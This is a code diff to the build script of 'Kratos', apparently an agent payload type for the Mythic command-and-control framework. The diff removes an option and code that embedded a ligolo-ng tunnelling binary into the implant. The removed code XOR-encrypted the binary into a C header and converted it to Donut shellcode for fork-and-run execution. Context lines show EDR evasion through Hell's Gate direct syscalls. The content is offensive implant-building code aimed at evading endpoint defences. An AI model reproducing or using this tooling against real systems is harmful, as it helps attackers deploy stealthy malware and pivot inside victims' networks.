@@ -67,16 +67,6 @@ class Kratos(PayloadType):
             default_value=True,
             description="EDR evasion: Hell's Gate direct syscalls (bypass hooked Nt* functions)"
         ),
-        BuildParameter(
-            name="embedded_binary",
-            parameter_type=BuildParameterType.File,
-            required=False,
-            description=(
-                "Optional binary to embed in the agent (e.g. custom ligolo-ng agent). "
-                "If provided, the 'ligolo' command drops and executes it directly without upload. "
-                "Leave empty to disable."
-            )
-        ),
     ]
     agent_path = pathlib.Path(".") / "kratos" / "mythic"
     agent_code_path = pathlib.Path(".") / "kratos" / "agent_code"
@@ -247,91 +237,8 @@ class Kratos(PayloadType):
                 StepSuccess=True
             ))
 
-            # Embedded ligolo-ng → shellcode via Donut → XOR encrypted → embedded_ligolo.h
-            # Triggered automatically if ligolo_start is selected.
-            # Priority: user-provided embedded_binary > bundled binaries/agent.exe
-            embedded_define = ""
-            ligolo_selected = "ligolo_start" in self.commands.get_commands()
-
-            if ligolo_selected:
-                embedded_file_id = self.get_parameter("embedded_binary")
-                embedded_data = None
-                source = ""
-
-                if embedded_file_id:
-                    file_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
-                        AgentFileId=embedded_file_id
-                    ))
-                    if file_resp.Success and file_resp.Content:
-                        embedded_data = file_resp.Content
-                        source = "user-provided"
-
-                if embedded_data is None:
-                    fallback_path = pathlib.Path("/Mythic/binaries/agent.exe")
-                    if fallback_path.exists():
-                        with open(fallback_path, "rb") as fb:
-                            embedded_data = fb.read()
-                        source = f"bundled binaries/agent.exe ({len(embedded_data)} bytes)"
-
-                if embedded_data:
-                    # --- Disk-drop path: XOR encrypt raw PE → embedded_ligolo.h ---
-                    xor_key = list(os.urandom(16))
-                    encrypted = bytes(b ^ xor_key[i % 16] for i, b in enumerate(embedded_data))
-                    hex_enc = ", ".join(f"0x{b:02x}" for b in encrypted)
-                    hex_key = ", ".join(f"0x{b:02x}" for b in xor_key)
-                    header = (
-                        "#pragma once\n"
-                        f"static const unsigned char g_ligolo_data[] = {{{hex_enc}}};\n"
-                        f"static const unsigned int  g_ligolo_size   = {len(encrypted)};\n"
-                        f"static const unsigned char g_ligolo_key[]  = {{{hex_key}}};\n"
-                        f"static const unsigned int  g_ligolo_key_size = 16;\n"
-                    )
-                    header_path = pathlib.Path(agent_build_path.name) / "embedded_ligolo.h"
-                    with open(header_path, "w") as hf:
-                        hf.write(header)
-                    embedded_define = "-DEMBEDDED_LIGOLO"
-                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="Configuring",
-                        StepStdout=f"Ligolo-ng ({source}): {len(embedded_data)} bytes raw PE → XOR encrypted → embedded_ligolo.h",
-                        StepSuccess=True
-                    ))
-
-                    # --- Fork+run path: Donut (no args) → cache shellcode bytes (base64) ---
-                    # Upload to Mythic happens at task time (requires TaskID not available here).
-                    # Args passed at runtime via CreateProcessW lpCommandLine (GetCommandLineW trick).
-                    try:
-                        with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as tf:
-                            tf.write(embedded_data)
-                            tmp_exe = tf.name
-                        sc_bytes = bytes(donut.create(file=tmp_exe, arch=2, bypass=3, format=1))
-                        os.unlink(tmp_exe)
-
-                        cache_path = "/tmp/ligolo_sc_cache.json"
-                        try:
-                            with open(cache_path) as cf:
-                                cache = json.load(cf)
-                        except Exception:
-                            cache = {}
-                        cache[self.uuid] = base64.b64encode(sc_bytes).decode("ascii")
-                        with open(cache_path, "w") as cf:
-                            json.dump(cache, cf)
-                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="Generating Shellcode",
-                            StepStdout=f"Ligolo fork+run shellcode ready ({len(sc_bytes)} bytes); will upload at task time.",
-                            StepSuccess=True
-                        ))
-                    except Exception as e:
-                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="Generating Shellcode",
-                            StepStdout=f"Warning: fork+run Donut step failed: {e}\nDisk-drop still works.",
-                            StepSuccess=True
-                        ))
-
-            # Pass CFLAGS to make (commandes + backend crypto + evasion + embedded)
-            command = f"make CC=x86_64-w64-mingw32-gcc CFLAGS=\"{command_defines} {crypto_define} {evasion_defines} {embedded_define} -DBUILD\""
+            # Pass CFLAGS to make (commandes + backend crypto + evasion)
+            command = f"make CC=x86_64-w64-mingw32-gcc CFLAGS=\"{command_defines} {crypto_define} {evasion_defines} -DBUILD\""
             
             proc = await asyncio.create_subprocess_shell(
                 command,
